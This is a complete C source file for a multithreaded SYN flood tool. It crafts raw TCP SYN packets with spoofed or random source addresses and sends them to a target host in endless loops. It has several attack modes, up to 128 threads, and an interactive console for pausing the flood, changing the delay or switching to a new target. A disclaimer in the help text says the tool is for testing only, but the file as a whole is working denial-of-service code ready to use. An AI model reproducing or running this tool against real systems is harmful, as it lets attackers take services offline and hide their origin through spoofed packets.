#include <stdio.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <string.h>
#include <netdb.h>
#include <errno.h>
#include <stdlib.h>
#include <time.h> 
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <string.h>

extern char *optarg;
extern int optind;

/* The max thread number */
#define MAXCHILD 128


#define MODEL_FAST 0
#define MODEL_NORMAL 1
#define MODEL_SET_IP 2
#define MODEL_SET_PORT 3
#define MODEL_SET_IP_AND_PORT 4
#define MODEL_DEBUG 5


typedef struct  ip {
	unsigned char       hl;
	unsigned char       tos;
	unsigned short      total_len;
	unsigned short      id;
	unsigned short      frag_and_flags;
	unsigned char       ttl;
	unsigned char       proto;
	unsigned short      checksum;
	unsigned int        sourceIP;
	unsigned int        destIP;
}ip_struct;

typedef struct  tcphdr {
	unsigned short      sport;
	unsigned short      dport;
	unsigned int        seq;
	unsigned int        ack;
	unsigned char       lenres;
	unsigned char       flag;
	unsigned short      win;
	unsigned short      sum;
	unsigned short      urp;
}tcphdr_struct;

typedef struct  ip_and_tcp{
	ip_struct _ip;
	tcphdr_struct tcp;
}ip_tcp;

typedef union int_and_short{
	unsigned int sum;
	unsigned short low_and_high[2];
}int_short;


/* Edit the interrupt of Control + C */
void sig_int(int signo);

//It doesn't have to be calculated. The system will do it for us.
unsigned short ip_checksum(unsigned short *buffer);


void init_header(ip_struct *ip, tcphdr_struct *tcp,char *dst_ip,int dst_port);

//Convenient to pass parameters and manage
typedef struct thread_argument{
    int model;

    struct sockaddr_in *addr;
    char *dst_ip;
    char source_ip[0x20];
    int dst_port;
    int source_port;
    int sockfd;
    int time;
    pthread_mutex_t *mutex;
}thread_arg;

//for Thread start
void *send_synflood(void *arg);

//Make the first and second byte exchange
unsigned short reverse_short(unsigned short str)
{
	unsigned char temp = (unsigned char)(str>>8);
	str <<= 8;
	str += temp;
	return str;
}


unsigned short ip_checksum(unsigned short *buffer)
{
	int sum = 0;

	for (int i = 0; i < 10; i++)
	{
		sum += reverse_short(buffer[i]);
	}

	unsigned short *temp = (unsigned short *)&sum + 1;
	sum += *temp;
	return (unsigned short)~sum;
}

unsigned short tcp_checksum(unsigned short *buffer)
{
	int_short run;
	run.sum = 0;

	//buffer += (20 - 8) / 2;
	buffer += 6;

	//For faster Assembly line speed, do not use branch structures.
	// for (int i = 0; i < 14; i++)
	// {
	// 	run.sum += reverse_short(buffer[i]);
	// }
	run.sum += reverse_short(buffer[0]);
	run.sum += reverse_short(buffer[1]);
	run.sum += reverse_short(buffer[2]);
	run.sum += reverse_short(buffer[3]);
	run.sum += reverse_short(buffer[4]);
	run.sum += reverse_short(buffer[5]);
	run.sum += reverse_short(buffer[6]);
	run.sum += reverse_short(buffer[7]);
	run.sum += reverse_short(buffer[8]);
	run.sum += reverse_short(buffer[9]);
	run.sum += reverse_short(buffer[10]);
	run.sum += reverse_short(buffer[11]);
	run.sum += reverse_short(buffer[12]);
	run.sum += reverse_short(buffer[13]);

	//sum += (6 + 20);
	run.sum += 26;

	run.low_and_high[0] += run.low_and_high[1];

	return (unsigned short)~run.low_and_high[0];
}


void init_header(ip_struct *ip, tcphdr_struct *tcp,char *dst_ip,int dst_port)
{
	int len = sizeof(ip_struct) + sizeof(tcphdr_struct);
	// IP header data initialization
	ip->hl = (4 << 4 | sizeof(ip_struct) / sizeof(unsigned int));
	ip->tos = 0;
	ip->total_len = htons(len);
	ip->id = 1;
	ip->frag_and_flags = 0x40;
	ip->ttl = 255;
	ip->proto = IPPROTO_TCP;
	//ip->checksum = 0;
	ip->sourceIP = 0;
	ip->destIP = inet_addr(dst_ip);


	tcp->dport = htons(dst_port);
	tcp->seq = htonl(rand() % 90000000 + 2345);
	tcp->ack = 0;
	tcp->lenres = (sizeof(tcphdr_struct) / 4 << 4 | 0);
	tcp->flag = 0x02;
	tcp->win = htons(2048);
	tcp->urp = 0;

	srand((unsigned)time(NULL));

}


/* Send the SYN package function
* Fill in IP header, TCP header
* TCP pseudo-headers are used only for the calculation of checksums
*/
void *send_synflood(void *arg)
{
	printf("Thread pid: %d is start!\n",getpid());
	thread_arg *_arg=arg;
	//char buf[100], sendbuf[100];
	int len;
	ip_tcp buf;


	len = sizeof(ip_struct) + sizeof(tcphdr_struct);

	/* Initialize header information */
	init_header(&buf._ip, &buf.tcp,_arg->dst_ip,_arg->dst_port);

	//Note: this is the kernel part of the program.
	//Welcome to optimize the efficiency of the kernel.
	
	int _sockfd=_arg->sockfd;
	struct sockaddr_in *_addr=_arg->addr;

	switch (_arg->model)
	{
	case MODEL_FAST:
		buf._ip.sourceIP = inet_addr(_arg->source_ip);
		buf.tcp.sport=_arg->source_port;

		while (1)
		{
			buf.tcp.sum = 0;
			//buf._ip.checksum = 0;


			//The IP checksum system computes, so you don't waste the CPU here
			//buf._ip.checksum = reverse_short(ip_checksum((unsigned short *)&buf));

			//Calaulate TCP checksum
			buf.tcp.sum = reverse_short(tcp_checksum((unsigned short *)&buf));//32

			sendto(_sockfd, &buf, 40/*len*/, 0, (struct sockaddr *) (_addr), sizeof(struct sockaddr));
		}
		
		break;
	case MODEL_NORMAL:
		while (1)
		{
			buf.tcp.sum = 0;

			buf._ip.sourceIP = rand();


			buf.tcp.sport = (u_int16_t)(rand() % 59152 + 6383);

			
			buf.tcp.sum = reverse_short(tcp_checksum((unsigned short *)&buf));//32

			if (sendto(_sockfd, &buf, 40/*len*/, 0, (struct sockaddr *) (_addr), sizeof(struct sockaddr))< 0)
			{
				perror("sendto()");
				break;
			}
		}
		
		break;
	case MODEL_SET_IP:
		buf._ip.sourceIP = inet_addr(_arg->source_ip);
		while (1)
		{
			buf.tcp.sum = 0;

			buf.tcp.sport = (u_int16_t)(rand() % 59152 + 6383);

			buf.tcp.sum = reverse_short(tcp_checksum((unsigned short *)&buf));//32

			if (sendto(_sockfd, &buf, 40/*len*/, 0, (struct sockaddr *) (_addr), sizeof(struct sockaddr))< 0)
			{
				perror("sendto()");
				break;
			}
		}

		break;
	case MODEL_SET_PORT:

		buf.tcp.sport=_arg->source_port;
		while (1)
		{
			buf.tcp.sum = 0;

			buf._ip.sourceIP = rand();

			buf.tcp.sum = reverse_short(tcp_checksum((unsigned short *)&buf));//32

			if (sendto(_sockfd, &buf, 40/*len*/, 0, (struct sockaddr *) (_addr), sizeof(struct sockaddr))< 0)
			{
				perror("sendto()");
				break;
			}
		}

		break;
	case MODEL_SET_IP_AND_PORT:
		buf._ip.sourceIP = inet_addr(_arg->source_ip);
		buf.tcp.sport=_arg->source_port;

		while (1)
		{
			buf.tcp.sum = 0;

			buf.tcp.sum = reverse_short(tcp_checksum((unsigned short *)&buf));//32

			if (sendto(_sockfd, &buf, 40/*len*/, 0, (struct sockaddr *) (_addr), sizeof(struct sockaddr))< 0)
			{
				perror("sendto()");
				break;
			}
		}

		break;
	
	case MODEL_DEBUG:
		while (1)
		{
			pthread_mutex_lock(_arg->mutex);
			pthread_mutex_unlock(_arg->mutex);
			buf.tcp.sum = 0;

			if(_arg->source_ip[0]==0)
			{
				buf._ip.sourceIP = rand();
			}
			else
			{
				buf._ip.sourceIP = inet_addr(_arg->source_ip);
			}
			
			

			if(_arg->source_port==0)
			{
				buf.tcp.sport = (u_int16_t)(rand() % 59152 + 6383);
			}
			else
			{
				buf.tcp.sport=_arg->source_port;
			}

			buf._ip.destIP=inet_addr(_arg->dst_ip);
			buf.tcp.dport=reverse_short(_arg->dst_port);

			buf.tcp.sum = reverse_short(tcp_checksum((unsigned short *)&buf));//32

			if (sendto(_sockfd, &buf, 40/*len*/, 0, (struct sockaddr *) (_addr), sizeof(struct sockaddr))< 0)
			{
				perror("sendto()");
				break;
			}

			if(_arg->time>0)
			{
				usleep(_arg->time);
			}
		}
		
		break;
	
	default:
			break;
	}

	printf("Thread pid: %d is end!\n",getpid());
	
}


void sig_int(int signo)
{
	puts("\nGoodbye!");
	exit(0);
}



char *help="\
Usage: syn [OPTION] destination_ip:destination_port\n\
  -h                                    Show the help infomation.\n\
  -d                                    Open the debug model.\n\
  -i [source_ip]                        Set the source ip.\n\
                                          Default random IP.\n\
  -p [source_port]                      Set the source port.\n\
                                          Default random port.\n\
  -t [millisecond]                      Delay after each attack.\n\
                                          Default 0.\n\
  -f                                    Open fast model, it need\n\
                                          -i and -p argument.\n\
  -l [thread_number]                    Set the thread number.\n\
                                          The max thread number is %d\n\
\n\
For example:\n\
  syn 192.168.1.1:80\n\
\n\
If you have some problems, welcome to website < www.eonew.cn > to contact author.\n\
The software is only used for test, please do not use illegally.\n\
Otherwise, you will accept responsibility for the negative results or effects of your choice or action,\n\
and author is not responsible.\n\
";
char *debug_help="\
  h                                    Show the help infomation.\n\
  q                                    Quit this software.\n\
  w                                    Pause all thread.\n\
  r                                    Restart all thread.\n\
  s                                    Show all infomations.\n\
  a [destination_ip:destination_port]  The target you need to attack.\n\
  i [source_ip]                        Set the source ip.\n\
                                          Default random IP.\n\
  p [source_port]                      Set the source port.\n\
                                          Default random port.\n\
  t [millisecond]                      Delay after each attack.\n\
                                          Default 0.\n\
\n\
If you have some problems, welcome to website < www.eonew.cn > to contact author.\n\
The software is only used for test, please do not use illegally.\n\
Otherwise, you will accept responsibility for the negative results or effects of your choice or action,\n\
and author is not responsible.\n\
";


int main(int argc, char *argv[])
{
    if(argc==1)
    {
        printf(help,MAXCHILD);
        return 0;
    }
    int arg_d=0,arg_i=0,arg_p=0,arg_t=0,arg_f=0,arg_a=0,arg_l=0;

	int thread=1;

    char dst_ip[0x20] = { 0 };
    int dst_port;

    thread_arg arg={0};
    int opt;
    while((opt=getopt(argc,argv,"h:di:p:t:fl:"))!=-1)
    {
        char buf[0x20]={0};
        switch(opt)
        {
            case 'h':
                printf(help,MAXCHILD);
                return 0;
            case 'd':
                arg_d=1;
                break;
            case 'i':
                arg_i=1;
                strncpy(arg.source_ip,optarg,0x20);
                break; 
            case 'p':
                arg_p=1;
                strncpy(buf,optarg,0x20);
                arg.source_port=atoi(buf);
                break; 
            case 't':
                arg_t=1;
                strncpy(buf,optarg,0x20);
                arg.time=atoi(buf);
                
                break; 
            case 'f':                
                arg_f=1;                
                break;
            case 'l':
                arg_l=1;
                strncpy(buf,optarg,0x20);
                thread=atoi(buf);
                break; 
        }
    }

    if(optind<argc)
    {
        char buf[0x20]={0};
        strncpy(buf,argv[optind],0x20);
        char *t=strchr(buf,':');
        *t=0;

        strncpy(dst_ip,buf,0x20);
        dst_port=atoi(t+1);

        arg_a=1;
    }
    
    
    arg.model=MODEL_NORMAL;
    if(arg_a==0)
    {
        fprintf(stderr,"Error: Don't have target! Enter -h for help\n");
        exit(1);
    }
    else if(arg_d==1&&arg_f==1)
    {
        fprintf(stderr,"Error: Parameters -d and -f cannot be used together! Enter -h for help\n");
        exit(1);
    }
    else if(arg_f==1 && !(arg_i==1 && arg_p==1))
    {
        fprintf(stderr,"Error: Using fast model need to set source ip and source port! Enter -h for help\n");
        exit(1);
    }
    else if(arg_t==1 && arg_d==0)
    {
        fprintf(stderr,"Error: Using delay model need to add -d argument! Enter -h for help\n");
        exit(1);
    }
    // else if(arg_l==1&&arg_d==1)
    // {
    //     fprintf(stderr,"Error: Parameters -d and -l cannot be used together! Enter -h for help\n");
    //     exit(1);
    // }
    else if(arg_f==1)
    {
        arg.model=MODEL_FAST;
    }
    else if(arg_d==1)
    {
        arg.model=MODEL_DEBUG;
    }
    else if(arg_i==1&&arg_p==0)
    {
        arg.model=MODEL_SET_IP;
    }
    else if(arg_i==0&&arg_p==1)
    {
        arg.model=MODEL_SET_PORT;
    }
    else
    {
        arg.model=MODEL_NORMAL;
    }
    
    /* Raw socket */
    int sockfd;

	struct sockaddr_in addr;
	struct hostent * host = NULL;

	int on = 1;
	pthread_t pthread[MAXCHILD];
	int err = -1;

    //initail mutex lock
    pthread_mutex_t mutex={0};
    arg.mutex=&mutex;


	/* Intercept the signal CTRL+C */
	signal(SIGINT, sig_int);


	memset(&addr, 0, sizeof(addr));

	addr.sin_family = AF_INET;
	addr.sin_port = htons(dst_port);

	if (inet_addr(dst_ip) == INADDR_NONE)
	{
		/* For DNS address, query and convert to IP address */
		host = gethostbyname(argv[1]);
		if (host == NULL)
		{
			perror("gethostbyname()");
			exit(1);
		}
		addr.sin_addr = *((struct in_addr*)&(host->h_addr_list));
		strncpy(dst_ip, inet_ntoa(addr.sin_addr), 16);
	}
	else
	{
		addr.sin_addr.s_addr = inet_addr(dst_ip);
	}

	if (dst_port < 0 || dst_port > 65535)
	{
		printf("Port Error\n");
		exit(1);
	}

	printf("host ip=%s\n", inet_ntoa(addr.sin_addr));

	/* Establish raw socket */
	sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	if (sockfd < 0)
	{
		perror("socket()");
		exit(1);
	}
	/* Set IP options */
	if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) < 0)
	{
		perror("setsockopt()");
		exit(1);
	}

	/* Change the program's permissions to regular users */
	//setuid(getpid());
    
    arg.addr=&addr;
    arg.dst_ip=dst_ip;
    arg.dst_port=dst_port;
    arg.sockfd=sockfd;
	puts("Start testing");
	/* Create multiple threads to work together */
	for(int i=0; i<thread; i++)
	{
		err = pthread_create(&pthread[i], NULL, send_synflood, (void *)&arg);

		if(err != 0)
		{
			fprintf(stderr,"pthread_create()\n");
			exit(1);
		}
	}

    //debug model
    if(arg_d==1)
    {
        usleep(1000);
        int lock=0;
        char buf[0x100];
        while(buf[0]!='q')
        {
            memset(buf,0,0x100);
            printf("syn >>> ");
            fflush(stdout);
            fflush(stdin);
            fgets(buf,0x100,stdin);
            switch (buf[0])
            {
                case 'q':
                    puts("Goodbye!");
                    break;

                case 'h':
                    printf(debug_help,MAXCHILD);
                    break;

                case 't':
                    if(buf[1]!=' ')
                    {
                        fprintf(stderr,"Error: enter h for help\n");
                        break;
                    }
                    arg.time=atoi(buf+2);
                    printf("Set %d ms delay.\n",arg.time);
                    break;

                case 'i':
                    if(buf[1]!=' ')
                    {
                        fprintf(stderr,"Error: enter h for help\n");
                        break;
                    }
                    strncpy(arg.source_ip,buf+2,0x20);
                    printf("Set the source IP to %s.\n",buf+2);
                    break;

                case 'p':
                    if(buf[1]!=' ')
                    {
                        fprintf(stderr,"Error: enter h for help\n");
                        break;
                    }
                    arg.source_port=atoi(buf+2);
                    printf("Set the source port to %d.\n",arg.source_port);
                    break;

                case 'w':
                    if(lock==0)
                    {
                        pthread_mutex_lock(arg.mutex);
                        puts("Pause all threads.");
                        lock=1;
                    }
                    else
                    {
                        fprintf(stderr,"Error: All threads had been stopped!\n");
                    }
                    
                    break;

                case 'r':
                    if(lock==1)
                    {
                        pthread_mutex_unlock(arg.mutex);
                        puts("Restart all threads.");
                        lock=0;
                    }
                    else
                    {
                        fprintf(stderr,"Error: All threads had been started!\n");
                    }
                    break;
                case 'a':
                    if(buf[1]!=' ')
                    {
                        fprintf(stderr,"Error: enter h for help\n");
                        break;
                    }
                    char *t=strchr(buf,'\n');
                    *t=0;
                    t=strchr(buf,':');
                    *t=0;

                    strncpy(dst_ip,buf+2,0x20);
                    arg.dst_port=atoi(t+1);
                    *t=':';
                    printf("Set new attack target :%s\n",buf+2);
                    break;
                case 's':
                    printf("Target:         %s:%d\n",arg.dst_ip,arg.dst_port);
                    printf("Delay:          %d ms\n",arg.time);

                    if(arg.source_ip[0]!=0)
                    printf("Source IP:      %s\n",arg.source_ip);
                    else
                    printf("Source IP:      Random IP\n");

                    if(arg.source_port!=0)
                    printf("Source port:    %d\n",arg.source_port);

                    printf("Thread number:  %d\n",thread);

                    if(lock==0)
                    printf("All threads is runing.\n");
                    else if(lock==1)
                    printf("All threads is paused.\n");

                    break;
                default:
                    puts("Error: enter h for help");
                    break;
            }
        }

        return 0;
        
    }
    else
    {
        puts("Press Control+C to stop this program.");
    }

	/* Wait for all threads to end.  */
	for(int i=0; i<thread; i++)
	{
		err = pthread_join(pthread[i], NULL);
		if(err != 0)
		{
			fprintf(stderr,"pthread_join Error\n");
			exit(1);
		}
	}

	close(sockfd);

	return 0;
}


